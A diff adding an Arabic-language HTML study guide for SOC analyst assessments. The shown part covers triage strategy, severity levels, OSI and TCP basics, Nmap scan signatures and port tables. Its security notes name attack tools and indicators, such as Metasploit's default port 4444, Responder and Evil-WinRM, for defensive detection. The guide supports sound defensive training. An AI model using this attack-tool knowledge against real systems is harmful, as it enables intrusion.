@@ -1,0 +1,2259 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SOC Analyst Prep</title>
+<meta name="description" content="مرجع شامل للتحضير لـ SOC Analyst Assessment: أساسيات، Phishing، Logs، Web Attacks، سيناريوهات وأسئلة.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#f6f7fb; --panel:#ffffff; --panel2:#f0f2f8; --text:#1b2233; --muted:#5b6478; --border:#dfe3ee;
+  --accent:#0b7fa8; --accent-soft:#e3f4fa; --red:#c62839; --red-soft:#fde8ea; --green:#16834f; --green-soft:#e4f6ec;
+  --yellow:#a86b00; --yellow-soft:#fff4dc; --purple:#6b45c9; --purple-soft:#efe9fd;
+  --code-bg:#0f1522; --code-text:#d7e2f2; --code-border:#1f2a3d; --hl:#ffe28a;
+  --shadow:0 1px 2px rgba(16,24,40,.06),0 4px 14px rgba(16,24,40,.05);
+}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    --bg:#0b0f17; --panel:#121826; --panel2:#182033; --text:#e3e9f4; --muted:#93a0b8; --border:#243049;
+    --accent:#38bdf8; --accent-soft:#0f2a3a; --red:#ff6b7a; --red-soft:#341820; --green:#4ade80; --green-soft:#11291c;
+    --yellow:#fbbf24; --yellow-soft:#30260e; --purple:#a78bfa; --purple-soft:#221a3d;
+    --code-bg:#070a11; --code-text:#d7e2f2; --code-border:#1c2538; --hl:#7a5b00;
+    --shadow:0 1px 2px rgba(0,0,0,.4),0 6px 20px rgba(0,0,0,.25);
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#0b0f17; --panel:#121826; --panel2:#182033; --text:#e3e9f4; --muted:#93a0b8; --border:#243049;
+  --accent:#38bdf8; --accent-soft:#0f2a3a; --red:#ff6b7a; --red-soft:#341820; --green:#4ade80; --green-soft:#11291c;
+  --yellow:#fbbf24; --yellow-soft:#30260e; --purple:#a78bfa; --purple-soft:#221a3d;
+  --code-bg:#070a11; --code-text:#d7e2f2; --code-border:#1c2538; --hl:#7a5b00;
+  --shadow:0 1px 2px rgba(0,0,0,.4),0 6px 20px rgba(0,0,0,.25);
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth;scroll-padding-top:16px}
+body{margin:0;background:var(--bg);color:var(--text);font-family:"Cairo",system-ui,"Segoe UI",Tahoma,sans-serif;font-size:16px;line-height:1.85;-webkit-text-size-adjust:100%}
+code,pre,kbd,.mono{font-family:"JetBrains Mono",ui-monospace,Consolas,monospace}
+a{color:var(--accent)}
+.layout{display:grid;grid-template-columns:300px minmax(0,1fr);min-height:100vh}
+/* Sidebar */
+.side{position:sticky;top:0;height:100vh;overflow:auto;background:var(--panel);border-inline-end:1px solid var(--border);padding:18px 14px 40px}
+.brand{display:flex;align-items:center;gap:10px;margin-bottom:12px}
+.brand .logo{width:38px;height:38px;border-radius:10px;background:linear-gradient(135deg,var(--accent),var(--purple));display:grid;place-items:center;color:#fff;font-weight:800;font-size:14px}
+.brand b{font-size:17px;display:block;line-height:1.2}
+.brand small{color:var(--muted);font-size:12px}
+.searchbox{width:100%;padding:9px 12px;border-radius:10px;border:1px solid var(--border);background:var(--panel2);color:var(--text);font:inherit;font-size:14px}
+.prog{margin:12px 0 6px;font-size:13px;color:var(--muted)}
+.bar{height:8px;background:var(--panel2);border-radius:99px;overflow:hidden;border:1px solid var(--border)}
+.bar i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--green),var(--accent));transition:width .3s}
+.toc{list-style:none;padding:0;margin:14px 0 0}
+.toc .grp{font-size:11.5px;font-weight:800;color:var(--muted);letter-spacing:.3px;margin:14px 6px 4px}
+.toc a{display:flex;justify-content:space-between;align-items:center;gap:8px;text-decoration:none;color:var(--text);padding:6px 10px;border-radius:8px;font-size:14px}
+.toc a:hover{background:var(--panel2)}
+.toc a.active{background:var(--accent-soft);color:var(--accent);font-weight:700}
+.toc a .ok{color:var(--green);font-size:12px;visibility:hidden}
+.toc a.done .ok{visibility:visible}
+.side .row{display:flex;gap:8px;margin-top:10px}
+.btn{border:1px solid var(--border);background:var(--panel2);color:var(--text);padding:6px 12px;border-radius:9px;font:inherit;font-size:13px;cursor:pointer}
+.btn:hover{border-color:var(--accent)}
+.btn.primary{background:var(--accent);border-color:var(--accent);color:#fff}
+/* Main */
+main{padding:28px 34px 80px;max-width:1120px;width:100%}
+.hero{background:linear-gradient(135deg,var(--accent-soft),var(--purple-soft));border:1px solid var(--border);border-radius:18px;padding:26px 26px 20px;margin-bottom:26px}
+.hero h1{margin:0 0 6px;font-size:30px;line-height:1.35}
+.hero p{margin:4px 0;color:var(--muted)}
+.chips{display:flex;flex-wrap:wrap;gap:8px;margin-top:12px}
+.chip{font-size:12.5px;padding:3px 10px;border-radius:99px;background:var(--panel);border:1px solid var(--border)}
+section.sec{background:var(--panel);border:1px solid var(--border);border-radius:16px;padding:22px 26px;margin:0 0 24px;box-shadow:var(--shadow)}
+section.sec>header{display:flex;justify-content:space-between;align-items:flex-start;gap:12px;border-bottom:1px solid var(--border);padding-bottom:10px;margin-bottom:14px}
+section.sec h2{margin:0;font-size:24px;line-height:1.4}
+section.sec h2 .num{color:var(--accent);font-family:"JetBrains Mono",monospace;font-size:17px;margin-inline-end:8px}
+.donebox{white-space:nowrap;font-size:13px;color:var(--muted);display:flex;align-items:center;gap:6px;cursor:pointer;user-select:none}
+.donebox input{width:17px;height:17px;accent-color:var(--green)}
+h3{font-size:19px;margin:26px 0 8px;color:var(--text);border-inline-start:4px solid var(--accent);padding-inline-start:10px;line-height:1.5}
+h4{font-size:16px;margin:18px 0 6px;color:var(--accent)}
+p{margin:8px 0}
+ul,ol{margin:6px 0;padding-inline-start:24px}
+li{margin:3px 0}
+.en{direction:ltr;unicode-bidi:isolate;font-family:"JetBrains Mono",monospace;font-size:.88em;background:var(--panel2);border:1px solid var(--border);padding:0 5px;border-radius:5px}
+code.i{direction:ltr;unicode-bidi:isolate;font-size:.86em;background:var(--panel2);border:1px solid var(--border);padding:0 5px;border-radius:5px;white-space:nowrap}
+code.i.wrap{white-space:normal;overflow-wrap:anywhere}
+.tbl td code.i{white-space:normal;overflow-wrap:anywhere}
+pre{direction:ltr;text-align:left;background:var(--code-bg);color:var(--code-text);border:1px solid var(--code-border);border-radius:12px;padding:14px 16px;overflow:auto;font-size:13px;line-height:1.65;position:relative;margin:10px 0;tab-size:4}
+pre .c{color:#7f8ea8}       /* comment */
+pre .r{color:#ff7b8a}       /* red / malicious */
+pre .g{color:#66e39a}       /* green / benign */
+pre .y{color:#ffd166}       /* yellow / note */
+pre .b{color:#6cc8ff}       /* blue / key */
+pre .p{color:#c4a5ff}
+pre .hl{background:rgba(255,94,110,.18);border-radius:3px;outline:1px solid rgba(255,94,110,.35)}
+.copy{position:absolute;top:8px;right:8px;font-size:11px;padding:2px 8px;border-radius:6px;border:1px solid #2c3a55;background:#141c2c;color:#b9c6dc;cursor:pointer;opacity:.75;font-family:"Cairo",sans-serif}
+.copy:hover{opacity:1}
+.tbl{overflow-x:auto;margin:10px 0;border:1px solid var(--border);border-radius:12px}
+table{border-collapse:collapse;width:100%;font-size:14px}
+th,td{padding:8px 11px;border-bottom:1px solid var(--border);vertical-align:top;text-align:start}
+th{background:var(--panel2);font-weight:700;white-space:nowrap}
+tr:last-child td{border-bottom:0}
+td.m,th.m{direction:ltr;text-align:left;font-family:"JetBrains Mono",monospace;font-size:12.8px;white-space:nowrap}
+.callout{border-radius:12px;padding:12px 16px;margin:12px 0;border:1px solid;border-inline-start-width:5px}
+.callout b.t{display:block;margin-bottom:2px}
+.tip{background:var(--green-soft);border-color:var(--green)}
+.tip b.t{color:var(--green)}
+.warn{background:var(--yellow-soft);border-color:var(--yellow)}
+.warn b.t{color:var(--yellow)}
+.danger{background:var(--red-soft);border-color:var(--red)}
+.danger b.t{color:var(--red)}
+.info{background:var(--accent-soft);border-color:var(--accent)}
+.info b.t{color:var(--accent)}
+.idea{background:var(--purple-soft);border-color:var(--purple)}
+.idea b.t{color:var(--purple)}
+.grid2{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:14px}
+.grid3{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:14px}
+.card{background:var(--panel2);border:1px solid var(--border);border-radius:12px;padding:12px 15px}
+.card h4{margin-top:2px}
+details{border:1px solid var(--border);border-radius:12px;margin:10px 0;background:var(--panel2)}
+details>summary{cursor:pointer;padding:10px 14px;font-weight:700;list-style:none;display:flex;gap:8px;align-items:center}
+details>summary::-webkit-details-marker{display:none}
+details>summary::before{content:"◀";font-size:11px;color:var(--accent);transition:transform .2s}
+details[open]>summary::before{transform:rotate(-90deg)}
+details>.body{padding:2px 16px 14px}
+details.ans{border-color:var(--green);background:var(--green-soft)}
+details.ans>summary{color:var(--green)}
+.lab{border:1px dashed var(--accent);border-radius:14px;padding:14px 18px;margin:18px 0;background:linear-gradient(180deg,var(--accent-soft),transparent 160px)}
+.lab>.lt{display:flex;gap:10px;align-items:center;font-weight:800;font-size:17px}
+.badge{display:inline-block;font-size:11.5px;font-weight:700;padding:1px 9px;border-radius:99px;border:1px solid}
+.b-red{color:var(--red);border-color:var(--red);background:var(--red-soft)}
+.b-green{color:var(--green);border-color:var(--green);background:var(--green-soft)}
+.b-yel{color:var(--yellow);border-color:var(--yellow);background:var(--yellow-soft)}
+.b-blue{color:var(--accent);border-color:var(--accent);background:var(--accent-soft)}
+.b-pur{color:var(--purple);border-color:var(--purple);background:var(--purple-soft)}
+.steps{counter-reset:s;list-style:none;padding:0}
+.steps>li{counter-increment:s;position:relative;padding-inline-start:42px;margin:10px 0}
+.steps>li::before{content:counter(s);position:absolute;inset-inline-start:0;top:2px;width:28px;height:28px;border-radius:50%;background:var(--accent);color:#fff;display:grid;place-items:center;font-weight:800;font-size:14px}
+.tree{direction:ltr;text-align:left}
+.kbd{display:inline-block;border:1px solid var(--border);border-bottom-width:2px;padding:0 6px;border-radius:5px;font-size:12px;background:var(--panel2)}
+mark{background:var(--hl);color:inherit;border-radius:3px;padding:0 2px}
+.hidden-by-search{display:none!important}
+/* flashcards & tools */
+.fc{display:grid;place-items:center;min-height:170px;border-radius:16px;border:1px solid var(--border);background:var(--panel2);padding:20px;text-align:center;cursor:pointer;user-select:none}
+.fc .q{font-size:26px;font-weight:800;direction:ltr}
+.fc .a{font-size:16px;color:var(--muted);margin-top:8px;display:none}
+.fc.show .a{display:block;color:var(--text)}
+.fc .cat{font-size:12px;color:var(--accent);margin-bottom:6px}
+textarea.tool{width:100%;min-height:110px;direction:ltr;text-align:left;font-family:"JetBrains Mono",monospace;font-size:13px;padding:10px;border-radius:10px;border:1px solid var(--border);background:var(--panel2);color:var(--text)}
+.toolbar{display:flex;flex-wrap:wrap;gap:8px;margin:10px 0}
+select.btn{padding:6px 10px}
+.menu-btn{display:none;position:fixed;bottom:16px;left:16px;z-index:50;border-radius:50%;width:52px;height:52px;font-size:22px;box-shadow:var(--shadow)}
+.totop{position:fixed;bottom:16px;right:16px;z-index:40;opacity:.85}
+@media (max-width:980px){
+  .layout{grid-template-columns:minmax(0,1fr)}
+  .side{position:fixed;inset:0 0 0 auto;width:min(86vw,320px);transform:translateX(105%);transition:transform .25s;z-index:60;box-shadow:var(--shadow)}
+  .side.open{transform:none}
+  .menu-btn{display:block}
+  main{padding:16px 16px 90px}
+  section.sec{padding:16px 16px}
+  .grid2,.grid3{grid-template-columns:minmax(0,1fr)}
+  code.i{white-space:normal;overflow-wrap:anywhere}
+  .hero h1{font-size:23px}
+  section.sec h2{font-size:20px}
+  .totop{display:none}
+}
+@media print{
+  .side,.menu-btn,.totop,.copy,.donebox{display:none!important}
+  .layout{display:block} main{max-width:none;padding:0}
+  details{display:block} details>.body{display:block}
+  section.sec{break-inside:auto;box-shadow:none}
+}
+</style>
+</head>
+<body>
+<div class="layout">
+<aside class="side" id="side">
+  <div class="brand"><div class="logo">SOC</div><div><b>SOC Analyst Prep</b><small>مرجع ليلة الـ Assessment</small></div></div>
+  <input class="searchbox" id="q" type="search" placeholder="ابحث… (مثلاً 4625 أو SPF أو sqlmap)">
+  <div class="prog"><span id="progtxt">التقدّم: 0%</span></div>
+  <div class="bar"><i id="progbar"></i></div>
+  <div class="row"><button class="btn" id="theme">🌓 الثيم</button><button class="btn" id="expand">📖 افتح الإجابات</button></div>
+  <ul class="toc" id="toc">
+    <li class="grp">ابدأ هنا</li>
+    <li><a href="#strategy">استراتيجية الـ Assessment<span class="ok">✓</span></a></li>
+    <li class="grp">الأساسيات</li>
+    <li><a href="#net">Networking<span class="ok">✓</span></a></li>
+    <li><a href="#win">Windows Internals & Logs<span class="ok">✓</span></a></li>
+    <li><a href="#linux">Linux<span class="ok">✓</span></a></li>
+    <li><a href="#code">قراءة الأكواد و الـ Encoding<span class="ok">✓</span></a></li>
+    <li><a href="#concepts">مفاهيم و Frameworks<span class="ok">✓</span></a></li>
+    <li class="grp">التحليل العملي</li>
+    <li><a href="#phishing">Phishing Analysis<span class="ok">✓</span></a></li>
+    <li><a href="#proxy">Proxy Logs<span class="ok">✓</span></a></li>
+    <li><a href="#firewall">Firewall Logs<span class="ok">✓</span></a></li>
+    <li><a href="#edr">EDR & Process Trees<span class="ok">✓</span></a></li>
+    <li><a href="#winevents">Windows Event Investigation<span class="ok">✓</span></a></li>
+    <li><a href="#dns">DNS Logs<span class="ok">✓</span></a></li>
+    <li><a href="#web">Web Attacks<span class="ok">✓</span></a></li>
+    <li><a href="#ad">Active Directory Attacks<span class="ok">✓</span></a></li>
+    <li><a href="#malware">Malware & C2<span class="ok">✓</span></a></li>
+    <li><a href="#siem">SIEM Queries (SPL / KQL)<span class="ok">✓</span></a></li>
+    <li class="grp">التدريب</li>
+    <li><a href="#labs">Practice Labs (13 سيناريو)<span class="ok">✓</span></a></li>
+    <li><a href="#interview">أسئلة الإنترفيو<span class="ok">✓</span></a></li>
+    <li><a href="#flash">Flashcards<span class="ok">✓</span></a></li>
+    <li><a href="#report">Incident Report Template<span class="ok">✓</span></a></li>
+    <li><a href="#tools">أداة Decode + Tools<span class="ok">✓</span></a></li>
+    <li><a href="#final">Checklist ليلة الامتحان<span class="ok">✓</span></a></li>
+  </ul>
+</aside>
+<button class="btn primary menu-btn" id="menu" aria-label="القائمة">☰</button>
+<button class="btn totop" onclick="scrollTo({top:0})">↑ لأعلى</button>
+
+<main id="main">
+<div class="hero">
+  <h1>🛡️ SOC Analyst Assessment — المرجع الكامل</h1>
+  <p>الملف ده معمول عشان تراجع منه الليلة دي وتدخل بكرة واثق من نفسك. هتلاقي فيه: أساسيات مختصرة ← طريقة التحليل ← أمثلة Logs حقيقية الشكل ← 13 سيناريو تدريبي بإجابات مخفية ← أسئلة إنترفيو.</p>
+  <p><b>طريقة المذاكرة المقترحة:</b> اقرأ الاستراتيجية الأول (10 دقايق) ← لِف على الأساسيات بسرعة ← ركّز في Phishing + Logs + Web ← حل الـ Labs <u>من غير</u> ما تبص على الإجابة ← اختم بالـ Flashcards.</p>
+  <div class="chips">
+    <span class="chip">🔍 البحث شغال على كل الملف</span>
+    <span class="chip">✅ علّم كل قسم تخلصه</span>
+    <span class="chip">🧪 أداة Base64/URL decode جوه الملف</span>
+    <span class="chip">⚠️ كل الـ IPs والدومينات أمثلة وهمية (Documentation ranges)</span>
+  </div>
+</div>
+
+<!-- ===================== STRATEGY ===================== -->
+<section class="sec" id="strategy">
+<header><h2><span class="num">00</span>استراتيجية الـ Assessment — إزاي تفكر وتكتب الإجابة</h2><label class="donebox"><input type="checkbox">خلصته</label></header>
+
+<p>الـ Assessment بتاع SOC مش بيختبر إنك حافظ Event IDs وبس، هو بيختبر <b>طريقة تفكيرك</b>: هل بتبني استنتاج على دليل؟ هل بتعرف تفرّق بين الـ noise والـ real threat؟ هل بتعرف تكتب Report مفهوم لحد مش تقني؟</p>
+
+<h3>المنهجية الذهبية لأي سؤال تحليل (Triage Loop)</h3>
+<ol class="steps">
+  <li><b>Understand the alert:</b> إيه اللي حصل؟ مين (user/host)؟ إمتى (timestamp + timezone)؟ منين لفين (src → dst)؟</li>
+  <li><b>Collect evidence:</b> استخرج كل الـ <span class="en">IOCs</span> (IPs, domains, URLs, hashes, emails, filenames, user-agents).</li>
+  <li><b>Enrich:</b> اعمل lookup للـ IOCs (VirusTotal, AbuseIPDB, urlscan, WHOIS — عمر الدومين؟).</li>
+  <li><b>Correlate:</b> اربط بين مصادر مختلفة: Email → Proxy (حد داس؟) → EDR (حاجة اتنفذت؟) → Firewall/DNS (فيه C2؟).</li>
+  <li><b>Verdict:</b> <span class="badge b-red">True Positive</span> / <span class="badge b-green">False Positive</span> / <span class="badge b-yel">Benign True Positive</span> / محتاج Escalation — مع <u>السبب</u>.</li>
+  <li><b>Scope & Impact:</b> كام user/host اتأثر؟ فيه data خرجت؟ الـ account اتسرق؟</li>
+  <li><b>Response:</b> Containment (isolate, block, reset, purge) + Eradication + Recovery + Lessons learned.</li>
+</ol>
+
+<div class="callout tip"><b class="t">💡 شكل الإجابة اللي بيبهر اللي بيصحح</b>
+لما تجاوب أي سؤال تحليل اكتبه بالترتيب ده (حتى لو مش مطلوب):
+<b>Summary</b> (سطرين) ← <b>Evidence / Findings</b> (bullets بدليل من اللوج) ← <b>IOCs</b> (defanged) ← <b>MITRE ATT&amp;CK mapping</b> ← <b>Verdict + Severity</b> ← <b>Recommendations</b> (Immediate / Short-term / Long-term).
+</div>
+
+<h3>قواعد ذهبية لازم تبان في إجاباتك</h3>
+<div class="grid2">
+  <div class="card"><h4>✅ اعمل</h4><ul>
+    <li><b>Defang</b> أي IOC: <code class="i">hxxps://evil[.]com</code> و <code class="i">203.0.113[.]5</code></li>
+    <li>اذكر الـ <b>timestamps</b> وخلي بالك من الـ timezone (UTC vs local).</li>
+    <li>استشهد بالسطر نفسه من اللوج ("السطر 7 فيه POST لـ login.php بحجم 2KB…").</li>
+    <li>قول الـ <b>assumptions</b> بتاعتك صراحة لو المعلومة ناقصة.</li>
+    <li>فرّق بين <b>attempt</b> و <b>success</b> (Status code، bytes، follow-up activity).</li>
+    <li>اقترح <b>next steps</b>: "هشيك على EDR للـ host ده في نفس الوقت".</li>
+  </ul></div>
+  <div class="card"><h4>❌ ماتعملش</h4><ul>
+    <li>ماتقولش "malicious" من غير ما تقول ليه.</li>
+    <li>ماتعتمدش على VirusTotal = 0 detections إن الحاجة نضيفة (ممكن جديدة).</li>
+    <li>ماتفتحش لينكات/attachments على جهازك — sandbox بس.</li>
+    <li>ماتعتبرش SPF pass = إيميل آمن (الهاكر ممكن يكون عامل SPF لدومينه).</li>
+    <li>ماتعملش Upload لملف فيه بيانات الشركة على VirusTotal (Hash lookup الأول).</li>
+    <li>ماتنساش تتكلم عن الـ <b>Business impact</b>.</li>
+  </ul></div>
+</div>
+
+<h3>Severity — إزاي تقرّر</h3>
+<div class="tbl"><table>
+<tr><th>Severity</th><th>أمثلة</th><th>Response</th></tr>
+<tr><td><span class="badge b-red">Critical</span></td><td>Ransomware شغال، Domain Admin اتسرق، Data exfiltration مؤكد، DC compromised</td><td>فوري، Escalate لـ L2/L3 + IR team + Management</td></tr>
+<tr><td><span class="badge b-yel">High</span></td><td>User دخل Credentials في صفحة Phishing، Malware اتنفذ على Endpoint، Web shell على سيرفر</td><td>خلال دقايق: Isolate / Reset / Block</td></tr>
+<tr><td><span class="badge b-blue">Medium</span></td><td>Phishing وصل ومحدش داس، Brute force فاشل من الإنترنت، PUP/Adware</td><td>Block IOCs، Purge، Monitor</td></tr>
+<tr><td><span class="badge b-green">Low</span></td><td>Port scan من الإنترنت اتعمله Block، Spam عادي</td><td>Document & close</td></tr>
+</table></div>
+<p class="muted">القاعدة: <b>Severity = Impact × Likelihood/Confidence</b> + حساسية الأصل (Asset criticality): نفس الـ alert على Laptop عادي ≠ على Domain Controller.</p>
+</section>
+
+<!-- ===================== NETWORKING ===================== -->
+<section class="sec" id="net">
+<header><h2><span class="num">01</span>Networking Fundamentals</h2><label class="donebox"><input type="checkbox">خلصته</label></header>
+
+<h3>OSI Model — بزاوية SOC</h3>
+<p>حفظها بالجملة: <b>"All People Seem To Need Data Processing"</b> (من 7 لـ 1) أو <b>"Please Do Not Throw Sausage Pizza Away"</b> (من 1 لـ 7).</p>
+<div class="tbl"><table>
+<tr><th>#</th><th>Layer</th><th>وظيفتها</th><th>Protocols / أمثلة</th><th>PDU</th><th>هجمات مرتبطة</th></tr>
+<tr><td>7</td><td>Application</td><td>واجهة الـ apps مع الشبكة</td><td>HTTP, DNS, SMTP, FTP, SSH, LDAP</td><td>Data</td><td>SQLi, XSS, Phishing, DNS tunneling</td></tr>
+<tr><td>6</td><td>Presentation</td><td>Encoding, Encryption, Compression</td><td>TLS/SSL, JPEG, ASCII</td><td>Data</td><td>SSL stripping, Downgrade</td></tr>
+<tr><td>5</td><td>Session</td><td>فتح/قفل الجلسات</td><td>NetBIOS, RPC, SMB sessions</td><td>Data</td><td>Session hijacking</td></tr>
+<tr><td>4</td><td>Transport</td><td>Ports, Reliability</td><td>TCP, UDP</td><td>Segment / Datagram</td><td>SYN flood, Port scanning</td></tr>
+<tr><td>3</td><td>Network</td><td>Routing و IP addressing</td><td>IP, ICMP, IPsec</td><td>Packet</td><td>IP spoofing, ICMP tunneling, Smurf</td></tr>
+<tr><td>2</td><td>Data Link</td><td>MAC addressing، Switching</td><td>Ethernet, ARP, VLAN, 802.1X</td><td>Frame</td><td>ARP spoofing/MITM, MAC flooding, VLAN hopping</td></tr>
+<tr><td>1</td><td>Physical</td><td>Bits على السلك/الهوا</td><td>Cables, Wi-Fi radio, Hubs</td><td>Bits</td><td>Wiretapping, Jamming</td></tr>
+</table></div>
+<p>الـ <b>TCP/IP model</b> 4 طبقات: Application (5-7) ← Transport (4) ← Internet (3) ← Network Access (1-2).</p>
+
+<h3>TCP vs UDP</h3>
+<div class="grid2">
+<div class="card"><h4>TCP — Connection-oriented</h4><ul><li>3-way handshake، Reliable، Ordered، Retransmission</li><li>أمثلة: HTTP/S, SSH, SMB, RDP, SMTP</li><li>في اللوج: تقدر تعرف هل الـ connection اكتملت ولا لأ</li></ul></div>
+<div class="card"><h4>UDP — Connectionless</h4><ul><li>سريع، بدون ضمان وصول، بدون handshake</li><li>أمثلة: DNS (53)، DHCP، NTP، SNMP، Syslog، VoIP، QUIC</li><li>سهل يتعمل بيه Spoofing و Amplification DDoS</li></ul></div>
+</div>
+
+<h3>TCP 3-Way Handshake & Flags</h3>
+<pre><span class="b">Client</span>                         <span class="b">Server</span>
+  |  ---- SYN (seq=x) ---------->  |
+  |  &lt;--- SYN/ACK (seq=y,ack=x+1)  |
+  |  ---- ACK (ack=y+1) --------->  |   <span class="g">← Connection Established</span>
+  ...  data (PSH/ACK) ...
+  |  ---- FIN/ACK ---------------&gt;  |   <span class="c">← إنهاء طبيعي (4-way)</span>
+  |  ---- RST -------------------&gt;  |   <span class="c">← قطع مفاجئ / port مقفول</span></pre>
+<div class="tbl"><table>
+<tr><th>Flag</th><th>معناه</th><th>زاوية أمنية</th></tr>
+<tr><td class="m">SYN</td><td>طلب فتح اتصال</td><td>SYN كتير من غير ACK = SYN flood أو SYN scan (half-open)</td></tr>
+<tr><td class="m">ACK</td><td>تأكيد استلام</td><td>ACK scan بيستخدم لاكتشاف قواعد الـ Firewall</td></tr>
+<tr><td class="m">FIN</td><td>إنهاء بأدب</td><td>FIN scan (stealth)</td></tr>
+<tr><td class="m">RST</td><td>قطع فوري</td><td>Port مقفول بيرد RST/ACK على SYN</td></tr>
+<tr><td class="m">PSH / URG</td><td>ابعت فوراً / بيانات عاجلة</td><td>Xmas scan = FIN+PSH+URG — NULL scan = مفيش flags</td></tr>
+</table></div>
+<div class="callout info"><b class="t">Nmap Scans في اللوج</b>
+<b>SYN scan (-sS):</b> SYN → SYN/ACK → RST (المهاجم مابيكملش). <b>Connect scan (-sT):</b> handshake كامل ثم RST. <b>Port مفتوح</b> يرد SYN/ACK، <b>مقفول</b> يرد RST/ACK، <b>Filtered</b> مفيش رد أو ICMP unreachable.
+</div>
+
+<h3>Ports لازم تكون حافظها</h3>
+<div class="tbl"><table>
+<tr><th>Port</th><th>Service</th><th>ملاحظة أمنية</th><th>Port</th><th>Service</th><th>ملاحظة أمنية</th></tr>
+<tr><td class="m">20/21</td><td>FTP</td><td>Cleartext، Brute force</td><td class="m">389 / 636</td><td>LDAP / LDAPS</td><td>AD enumeration (BloodHound)</td></tr>
+<tr><td class="m">22</td><td>SSH / SFTP</td><td>Brute force، Tunneling</td><td class="m">443</td><td>HTTPS</td><td>أغلب الـ C2 بيستخبى هنا</td></tr>
+<tr><td class="m">23</td><td>Telnet</td><td>Cleartext — IoT botnets (Mirai)</td><td class="m">445</td><td>SMB</td><td>EternalBlue/WannaCry، Lateral movement، لازم مايخرجش للإنترنت</td></tr>
+<tr><td class="m">25 / 587 / 465</td><td>SMTP / Submission / SMTPS</td><td>Spam، Open relay</td><td class="m">1433</td><td>MSSQL</td><td>Brute force، xp_cmdshell</td></tr>
+<tr><td class="m">53</td><td>DNS (UDP/TCP)</td><td>Tunneling، Exfil، DGA</td><td class="m">3306</td><td>MySQL</td><td>مايبقاش مفتوح للإنترنت</td></tr>
+<tr><td class="m">67/68</td><td>DHCP</td><td>Rogue DHCP</td><td class="m">3389</td><td>RDP</td><td>Brute force — أشهر مدخل للـ Ransomware</td></tr>
+<tr><td class="m">80</td><td>HTTP</td><td>Web attacks</td><td class="m">5432</td><td>PostgreSQL</td><td></td></tr>
+<tr><td class="m">88</td><td>Kerberos</td><td>Kerberoasting، AS-REP roasting</td><td class="m">5985 / 5986</td><td>WinRM HTTP/HTTPS</td><td>Lateral movement (Evil-WinRM)</td></tr>
+<tr><td class="m">110 / 995</td><td>POP3 / POP3S</td><td></td><td class="m">6379</td><td>Redis</td><td>كتير بيتساب من غير auth</td></tr>
+<tr><td class="m">123</td><td>NTP</td><td>Amplification DDoS</td><td class="m">8080 / 3128</td><td>HTTP-alt / Squid proxy</td><td></td></tr>
+<tr><td class="m">135</td><td>MS-RPC</td><td>WMI، DCOM lateral movement</td><td class="m">9200</td><td>Elasticsearch</td><td>Data leaks</td></tr>
+<tr><td class="m">137-139</td><td>NetBIOS</td><td>LLMNR/NBT-NS poisoning (Responder)</td><td class="m">4444</td><td>Metasploit default</td><td>أي اتصال عليه = مريب جداً</td></tr>
+<tr><td class="m">143 / 993</td><td>IMAP / IMAPS</td><td></td><td class="m">514</td><td>Syslog (UDP)</td><td>Log shipping</td></tr>
+<tr><td class="m">161/162</td><td>SNMP</td><td>Community "public"</td><td class="m">1194 / 51820</td><td>OpenVPN / WireGuard</td><td></td></tr>
+</table></div>
+
+<h3>IP Addressing & Subnetting السريع</h3>
+<div class="grid2">
+<div class="card"><h4>Private ranges (RFC 1918)</h4>
+<ul><li><code class="i">10.0.0.0/8</code></li><li><code class="i">172.16.0.0/12</code> (172.16 → 172.31)</li><li><code class="i">192.168.0.0/16</code></li></ul>
+<h4>Special</h4><ul><li><code class="i">127.0.0.0/8</code> Loopback</li><li><code class="i">169.254.0.0/16</code> APIPA (DHCP فشل)</li><li><code class="i">100.64.0.0/10</code> CGNAT</li><li><code class="i">169.254.169.254</code> Cloud metadata (SSRF target!)</li><li>Documentation: <code class="i">192.0.2.0/24</code>، <code class="i">198.51.100.0/24</code>، <code class="i">203.0.113.0/24</code></li></ul></div>
+<div class="card"><h4>CIDR Cheat</h4>
+<div class="tbl"><table><tr><th>CIDR</th><th>Mask</th><th>Hosts usable</th></tr>
+<tr><td class="m">/32</td><td class="m">255.255.255.255</td><td>1 (host واحد)</td></tr>
+<tr><td class="m">/30</td><td class="m">255.255.255.252</td><td>2</td></tr>
+<tr><td class="m">/28</td><td class="m">255.255.255.240</td><td>14</td></tr>
+<tr><td class="m">/24</td><td class="m">255.255.255.0</td><td>254</td></tr>
+<tr><td class="m">/16</td><td class="m">255.255.0.0</td><td>65,534</td></tr>
+<tr><td class="m">/8</td><td class="m">255.0.0.0</td><td>16,777,214</td></tr></table></div>
+<p>القاعدة: Hosts = 2<sup>(32−CIDR)</sup> − 2</p></div>
+</div>
+<div class="callout warn"><b class="t">⚠️ لفتة مهمة في اللوجز</b>
+لو شفت Private IP كـ <b>source</b> بيكلّم Public IP غريب = اتجاه <b>Outbound</b> (ممكن C2/Exfil). لو Public IP كـ source بيكلم سيرفر داخلي = <b>Inbound</b> (Scan/Attack). <b>اتجاه الترافيك هو أول حاجة تحددها.</b>
+</div>
+
+<h3>DNS</h3>
+<p>بيحوّل الأسماء لـ IPs. الرحلة: Client ← Local cache ← Recursive resolver ← Root (.) ← TLD (.com) ← Authoritative NS.</p>
+<div class="tbl"><table>
+<tr><th>Record</th><th>وظيفته</th><th>Record</th><th>وظيفته</th></tr>
+<tr><td class="m">A / AAAA</td><td>Domain ← IPv4 / IPv6</td><td class="m">TXT</td><td>نصوص — فيها SPF، DKIM، DMARC، Verification (وبيستخدم في الـ Tunneling!)</td></tr>
+<tr><td class="m">CNAME</td><td>Alias لدومين تاني</td><td class="m">NS</td><td>الـ Name servers المسؤولة</td></tr>
+<tr><td class="m">MX</td><td>Mail server للدومين</td><td class="m">PTR</td><td>Reverse lookup: IP ← Domain</td></tr>
+<tr><td class="m">SOA</td><td>معلومات الـ Zone</td><td class="m">SRV</td><td>Services (مثلاً <code class="i">_ldap._tcp.dc._msdcs</code> في AD)</td></tr>
